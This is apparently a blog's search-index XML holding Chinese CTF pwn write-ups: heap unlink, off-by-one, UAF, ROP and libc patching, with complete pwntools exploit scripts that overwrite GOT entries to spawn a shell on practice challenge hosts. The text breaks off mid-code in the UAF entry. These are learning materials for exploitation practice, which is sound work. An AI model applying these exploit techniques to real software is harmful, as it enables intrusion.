<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>遇到的奇奇怪怪问题汇总</title>
    <link href="/2022/11/29/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <url>/2022/11/29/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>本来是很简单的一个溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>但是不加sleep无法通过</p><p>有人说是python同时发送多个字符串时会合并(?)</p><p>那什么时候情况下需要在sendline前面加一个sleep</p><p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p><hr>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF 2019 EasyHeap</title>
    <link href="/2022/11/29/%5BZJCTF%202019%5DEasyHeap/"/>
    <url>/2022/11/29/%5BZJCTF%202019%5DEasyHeap/</url>
    
    <content type="html"><![CDATA[<h4 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h4><p><a href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p><p>因此可以溢出</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p><ol><li><p>首先申请三个chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure><p><img src="/img/%5BZJCTF2019%5DEasyHeap/1.jpg"></p><p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p></li><li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/2.jpg"></p><p>查看heaparray地址上的值：</p><p><img src="/img/%5BZJCTF2019%5DEasyHeap/3.jpg"></p><p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p></li><li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br></code></pre></td></tr></table></figure><p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p></li><li><p>这时edit(0)会修改<code>free@got</code>的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure><p>将其函数改为system函数的plt表</p><blockquote><p>因为system没有被调用过，不能直接改成system@got</p></blockquote></li><li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p></li></ol><h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27679</span>)<br>elf = ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>heaparray_addr = <span class="hljs-number">0x6020E0</span><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Off-By-One</title>
    <link href="/2022/11/27/Off-By-One/"/>
    <url>/2022/11/27/Off-By-One/</url>
    
    <content type="html"><![CDATA[<h4 id="Off-By-One漏洞如何产生"><a href="#Off-By-One漏洞如何产生" class="headerlink" title="Off-By-One漏洞如何产生"></a>Off-By-One漏洞如何产生</h4><ol><li><p>循环多一次</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">x = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure><p>x的下一个chunk第一个字节被溢出了</p></li><li><p><code>strlen</code>和<code>strcpy</code>行为不一致</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">100</span>)<br>&#123;<br>    <span class="hljs-built_in">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>strlen</code>返回值不算结束符’<code>\0</code>，而<code>strcpy</code>复制时会把结束符在内的101个字符复制过去</p></li></ol><h4 id="hitcon-creator"><a href="#hitcon-creator" class="headerlink" title="hitcon_creator"></a>hitcon_creator</h4><p>题目来源</p><p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p><h5 id="1-create"><a href="#1-create" class="headerlink" title="1. create"></a>1. create</h5><p><img src="/img/off_by_one/1.png"></p><p>从上述结构可以推断出heaparray是如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class="hljs-type">char</span> * content;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span> * <span class="hljs-title">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure><h5 id="2-edit"><a href="#2-edit" class="headerlink" title="2. edit"></a>2. edit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>read_input</code>读取size+1字节，出现了off_by_one漏洞</p><p>可以覆盖下一个chunk的size字段</p><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ol><li><p>申请三个堆块，大小为0x18,0x10,0x10，加上三次size申请的0x10，一共6个chunk</p><p> <img src="/img/off_by_one/2.jpg"></p></li><li><p>修改0号块，写入<code>/bin/sh</code>，然后再溢出<code>0x81</code>到下一个chunk的size</p><p><img src="/img/off_by_one/3.jpg"></p></li><li><p>这时delete chunk 1，会合并到前一个chunk（也就是1的size所在chunk）中</p><p> <img src="/img/off_by_one/4.jpg"></p><p> 观察bins，发现这个chunk被free到fastbin的0x80节点上（0x20上也有一个chunk是因为delete也会将size释放掉）</p><p> <img src="/img/off_by_one/5.jpg"></p></li><li><p>申请一个新的chunk，将0x80这个块申请出来，因此malloc的大小需要为0x70</p><p> 同时，在2号的content位置写入<code>free@got</code></p><p> 这时调用show(2)会泄露free的地址</p><p> <img src="/img/off_by_one/6.jpg"></p></li><li><p>泄露libc基址找到system地址</p></li><li><p><code>edit(2,p64(system_addr))</code>时，会修改content指针指向的内容，而content指针被<code>free@got</code>替换掉了，所以free的got表被修改成了<code>system@got</code>上的地址</p></li><li><p>然后<code>delete(0)</code>时，首先要free掉<code>heaparray[0].content</code>上的内容，但是由于free被替换成了system，结果就变成了以content指针为参数调用system函数的情况，而<code>heaparray[0].content</code>恰好是之前写过的<code>/bin/sh</code>，因此执行了`system(‘/bin/sh’)</p></li></ol><h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><blockquote><p>libcsearcher挑版本为2.23的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x81&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x8</span>)+p64(free_got))<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#libc</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(system_addr))<br><span class="hljs-comment">#gdb.attach(r)</span><br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patchelf修改libc版本</title>
    <link href="/2022/11/27/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/"/>
    <url>/2022/11/27/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h4 id="安装glibc-all-in-one"><a href="#安装glibc-all-in-one" class="headerlink" title="安装glibc-all-in-one"></a>安装glibc-all-in-one</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure><h4 id="修改libc-so和ld-so"><a href="#修改libc-so和ld-so" class="headerlink" title="修改libc.so和ld.so"></a>修改libc.so和ld.so</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class="hljs-comment"># param1 : old libc.so</span><br><span class="hljs-comment"># param2 : new libc.so</span><br><span class="hljs-comment"># param3 : path to elf</span><br></code></pre></td></tr></table></figure><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><p><img src="/img/patchelf/1.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/11/25/unlink/"/>
    <url>/2022/11/25/unlink/</url>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容一律假设 sz = 4 bytes  ，32位系统</p></blockquote><h4 id="unlink时向任意地址写入数据原理"><a href="#unlink时向任意地址写入数据原理" class="headerlink" title="unlink时向任意地址写入数据原理"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p><p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p><p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class="hljs-number">8</span>)+<span class="hljs-number">12</span>) = *(P+<span class="hljs-number">12</span>)<br><span class="hljs-comment">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class="hljs-number">12</span>)+<span class="hljs-number">8</span>) = *(P+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p><p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p><p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p><blockquote><p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p></blockquote><p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p><h4 id="加入检查机制之后"><a href="#加入检查机制之后" class="headerlink" title="加入检查机制之后"></a>加入检查机制之后</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>因此溢出时需要额外保证以下条件</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">*(<span class="hljs-name">*</span>(<span class="hljs-name">P+8</span>) <span class="hljs-number">+12</span>) == P<br>*(<span class="hljs-name">*</span>(<span class="hljs-name">P+12</span>)+ <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure><p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p><p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p><p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>见文章 ：stkof</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF</title>
    <link href="/2022/11/22/%E5%A0%86%E5%88%A9%E7%94%A8%20UAF/"/>
    <url>/2022/11/22/%E5%A0%86%E5%88%A9%E7%94%A8%20UAF/</url>
    
    <content type="html"><![CDATA[<h4 id="参考ctf-wiki"><a href="#参考ctf-wiki" class="headerlink" title="参考ctf-wiki"></a>参考ctf-wiki</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p><h4 id="漏洞的发现"><a href="#漏洞的发现" class="headerlink" title="漏洞的发现"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= count) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (notelist[idx]) &#123;<br>    <span class="hljs-built_in">free</span>(notelist[idx]-&gt;content);<br>    <span class="hljs-built_in">free</span>(notelist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure><p>程序中给了system：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat 